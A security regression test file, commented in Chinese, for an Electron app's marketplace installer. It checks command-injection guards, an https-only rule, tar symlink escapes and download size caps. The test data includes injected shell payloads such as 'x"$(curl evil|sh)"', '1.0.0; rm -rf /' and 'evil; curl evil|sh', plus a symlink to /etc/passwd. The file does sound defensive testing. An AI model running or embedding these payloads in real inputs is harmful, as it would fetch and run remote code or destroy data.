// electron/tests/marketplace/security.test.ts
//
// S1 安全回归锁（应用安全审查 HIGH-1）：marketplace 安装链命令注入防护。
// 覆盖：
//   1. slug / version 含 shell 元字符 → 在任何路径拼接 / 子进程启动之前拒绝
//   2. downloadUrl 非 https → 拒绝（防明文劫持 + 非 http(s) 协议）
//   3. 解压必须走 execFile 数组参数形式（绝不允许 shell 字符串 exec——
//      slug 注入点在路径里，checksum 校验不缓解本问题）
//   4. 归档内含符号链接成员 → 拒绝安装并清理缓存目录（防 tar symlink 逃逸）
//   5. MCP 包 pkg.name 不符 npm 包名规范 → 不注册 npx 定义（防二次注入：
//      注册的 command/args 会被原样 spawn）
//   6. downloadFile 流式大小上限 → 超限中断并删除半成品文件
//
// 归档用系统 tar 现场构造（Linux/macOS 开发环境均内置），fetch 全程 mock，
// 不发真实网络请求。execFile 经 spy 包装后委托真实实现——既记录调用形态
// （断言数组参数），又保证真实解压路径被执行。

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { execSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import { runMigrations, closeDb, getDb } from '../../src/main/storage/db';
import {
  installPackage,
  listInstalled,
  downloadFile,
} from '../../src/main/marketplace/installer';
import type { MarketplaceItem } from '../../src/main/marketplace/types';

// 记录 execFile / exec 的调用形态（vi.hoisted：vi.mock 工厂内可引用）。
// Node 内置模块的 ESM namespace 不可重定义（vi.spyOn 会抛
// "Cannot redefine property"），故用 vi.mock 整体替换模块并委托真实实现。
const { execFileCalls, execCalls } = vi.hoisted(() => ({
  execFileCalls: [] as Array<{ cmd: string; args: string[] }>,
  execCalls: [] as string[],
}));

vi.mock('node:child_process', async (importOriginal) => {
  const real = await importOriginal<typeof import('node:child_process')>();
  type FnLike = (...args: unknown[]) => unknown;
  const realExecFile = real.execFile as unknown as FnLike;
  const realExec = real.exec as unknown as FnLike;
  return {
    ...real,
    execFile: (cmd: unknown, args: unknown, ...rest: unknown[]) => {
      execFileCalls.push({ cmd: String(cmd), args: Array.isArray(args) ? [...args] : [] });
      return realExecFile(cmd, args, ...rest);
    },
    exec: (cmd: unknown, ...rest: unknown[]) => {
      execCalls.push(String(cmd));
      return realExec(cmd, ...rest);
    },
  };
});

const tmpRoot = path.join(os.tmpdir(), `ap-mp-sec-test-${Date.now()}`);
let fetchSpy: ReturnType<typeof vi.spyOn>;

function makeItem(overrides: Partial<MarketplaceItem> = {}): MarketplaceItem {
  return {
    id: 'test-agent',
    type: 'agent',
    slug: 'test-agent',
    name: '测试 Agent',
    version: '1.0.0',
    author: 'tester',
    description: '一个测试用 agent',
    readme: '# 测试',
    tags: ['test'],
    category: 'dev',
    iconEmoji: '🧪',
    verificationStatus: 'community',
    downloadUrl: '',
    checksum: '',
    sizeBytes: 1,
    installCount: 0,
    ...overrides,
  };
}

/** 现场构造 tar.gz：files 写入相对路径 → 归档 → 返回归档绝对路径 */
function buildArchive(
  files: Record<string, string>,
  symlink?: { name: string; target: string },
): string {
  const srcDir = fs.mkdtempSync(path.join(tmpRoot, 'pkg-src-'));
  for (const [name, content] of Object.entries(files)) {
    const target = path.join(srcDir, name);
    fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, content);
  }
  if (symlink) {
    fs.symlinkSync(symlink.target, path.join(srcDir, symlink.name));
  }
  const archivePath = path.join(
    tmpRoot,
    `pkg-${Date.now()}-${Math.random().toString(36).slice(2)}.tar.gz`,
  );
  execSync(`tar -czf "${archivePath}" -C "${srcDir}" .`);
  fs.rmSync(srcDir, { recursive: true, force: true });
  return archivePath;
}

/** mock fetch：把本地文件包装成下载响应（web ReadableStream） */
function mockFetchFile(archivePath: string): void {
  const buf = fs.readFileSync(archivePath);
  const body = Readable.toWeb(Readable.from([buf])) as ReadableStream<Uint8Array>;
  fetchSpy.mockResolvedValue({ ok: true, status: 200, body } as Response);
}

beforeEach(() => {
  fs.mkdirSync(tmpRoot, { recursive: true });
  process.env.AP_USER_DATA_DIR = tmpRoot;
  runMigrations();
  fetchSpy = vi.spyOn(globalThis, 'fetch');
  execFileCalls.length = 0;
  execCalls.length = 0;
});

afterEach(() => {
  fetchSpy.mockRestore();
  vi.restoreAllMocks();
  closeDb();
  fs.rmSync(tmpRoot, { recursive: true, force: true });
  delete process.env.AP_USER_DATA_DIR;
});

describe('S1: 安装链命令注入防护', () => {
  it('slug 含 shell 元字符 → 在路径使用前拒绝（无缓存目录 / 无 DB 记录 / 无子进程）', async () => {
    const item = makeItem({ slug: 'x"$(curl evil|sh)"' });
    await expect(installPackage(item)).rejects.toThrow(/非法 slug/);
    expect(listInstalled()).toHaveLength(0);
    expect(fs.existsSync(path.join(tmpRoot, 'cache'))).toBe(false);
    expect(execCalls).toHaveLength(0);
    expect(execFileCalls).toHaveLength(0);
  });

  it('version 含 shell 元字符 → 拒绝', async () => {
    const item = makeItem({ version: '1.0.0; rm -rf /' });
    await expect(installPackage(item)).rejects.toThrow(/非法 version/);
    expect(fs.existsSync(path.join(tmpRoot, 'cache'))).toBe(false);
  });

  it('downloadUrl 非 https → 拒绝', async () => {
    const item = makeItem({ downloadUrl: 'http://evil.test/x.tar.gz' });
    await expect(installPackage(item)).rejects.toThrow(/https/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('远程包解压走 execFile 数组参数形式（tar 收到 string[] 而非整条 shell 命令）', async () => {
    const archive = buildArchive({ 'SKILL.md': '# demo\n', 'package.json': '{"name":"demo"}' });
    mockFetchFile(archive);
    const item = makeItem({
      type: 'skill',
      slug: 'demo-skill',
      downloadUrl: 'https://example.test/demo-skill.tar.gz',
    });

    const { cachePath } = await installPackage(item);

    // 真实解压发生了
    expect(fs.existsSync(path.join(cachePath, 'SKILL.md'))).toBe(true);
    // 绝不允许 shell 字符串 exec
    expect(execCalls).toHaveLength(0);
    // execFile 收到数组参数（第二个参数是 string[]，含 -xzf / -C 标志）
    const tarCall = execFileCalls.find((c) => c.cmd === 'tar');
    expect(tarCall).toBeDefined();
    expect(Array.isArray(tarCall!.args)).toBe(true);
    expect(tarCall!.args).toContain('-xzf');
    expect(tarCall!.args).toContain('-C');
  });

  it('归档含符号链接成员 → 拒绝并清理缓存目录', async () => {
    const archive = buildArchive(
      { 'SKILL.md': '# evil\n' },
      { name: 'evil-link', target: '/etc/passwd' },
    );
    mockFetchFile(archive);
    const item = makeItem({
      type: 'skill',
      slug: 'evil-skill',
      downloadUrl: 'https://example.test/evil.tar.gz',
    });

    await expect(installPackage(item)).rejects.toThrow(/符号链接/);
    // 与 checksum 失败清理同一契约：版本目录整体删除（含符号链接本身）
    expect(
      fs.existsSync(path.join(tmpRoot, 'cache', 'skills', 'evil-skill', '1.0.0')),
    ).toBe(false);
    expect(listInstalled()).toHaveLength(0);
  });

  it('MCP 包 pkg.name 含 shell 元字符 → 安装成功但不注册 npx 定义', async () => {
    const archive = buildArchive({
      'package.json': JSON.stringify({ name: 'evil; curl evil|sh', version: '1.0.0' }),
    });
    mockFetchFile(archive);
    const item = makeItem({
      type: 'mcp',
      slug: 'evil-mcp',
      downloadUrl: 'https://example.test/evil-mcp.tar.gz',
    });

    // 注册失败仅告警，安装本身成功（与既有语义一致）
    await installPackage(item);
    expect(listInstalled()).toHaveLength(1);

    const rows = getDb()
      .prepare("SELECT name FROM mcp_definitions WHERE source = 'marketplace'")
      .all() as Array<{ name: string }>;
    expect(rows.some((r) => r.name.includes('evil'))).toBe(false);
  });

  it('MCP 包 pkg.name 合法（@scope/name 形式）→ 正常注册', async () => {
    const archive = buildArchive({
      'package.json': JSON.stringify({ name: '@demo/ok-pkg', version: '1.0.0' }),
    });
    mockFetchFile(archive);
    const item = makeItem({
      type: 'mcp',
      slug: 'ok-mcp',
      downloadUrl: 'https://example.test/ok-mcp.tar.gz',
    });

    await installPackage(item);
    const rows = getDb()
      .prepare("SELECT name FROM mcp_definitions WHERE source = 'marketplace'")
      .all() as Array<{ name: string }>;
    expect(rows.some((r) => r.name === '@demo/ok-pkg')).toBe(true);
  });

  it('downloadFile 超过大小上限 → 中断下载并删除半成品文件', async () => {
    const big = Buffer.alloc(1024 * 1024);
    const body = Readable.toWeb(Readable.from([big])) as ReadableStream<Uint8Array>;
    fetchSpy.mockResolvedValue({ ok: true, status: 200, body } as Response);

    const dest = path.join(tmpRoot, 'cap-test.bin');
    await expect(downloadFile('https://example.test/big.bin', dest, 1024)).rejects.toThrow(
      /大小|超过/,
    );
    expect(fs.existsSync(dest)).toBe(false);
  });
});
